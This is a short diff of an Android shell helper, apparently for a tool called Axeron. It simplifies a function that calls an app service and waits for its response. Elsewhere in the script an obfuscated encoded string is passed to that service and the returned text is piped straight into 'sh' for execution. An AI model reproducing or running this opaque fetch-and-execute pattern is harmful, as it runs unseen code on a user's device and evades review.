@@ -21,18 +21,10 @@ shellstorm() {
   else
     path=$EXECPATH
   fi
-  am startservice -n com.fhrz.axeron/.ShellStorm --es api $api --es path $path
-  while [[ ! -f $path/response || ! -f $path/error ]]; do
-    sleep 1
-  done
-  
-  if [ -f "$path/response" ]; then
-    cat "$path/response"
-  else
-    cat "$path/error"
-  fi
+  am startservice -n com.fhrz.axeron/.ShellStorm --es api $api --es path $path > /dev/null
+  while [ ! -f $path/response ]; do sleep 1; done;
+  cat $path/response
 }
-
 
 axeroncore() {
   shellstorm "ARM17:16TXsNew16zXr9a21qvWq9ey167Xtde21qzWrNat1qrXo9el17DXpNex157Wqtel16vWq9ed17TXodeu16vXqtar16/XpNeh16jXqNar153XtNeh167Xq9eq15/Xq9eu16HWqtev16Q=" $(dirname $0) | sh -s $@
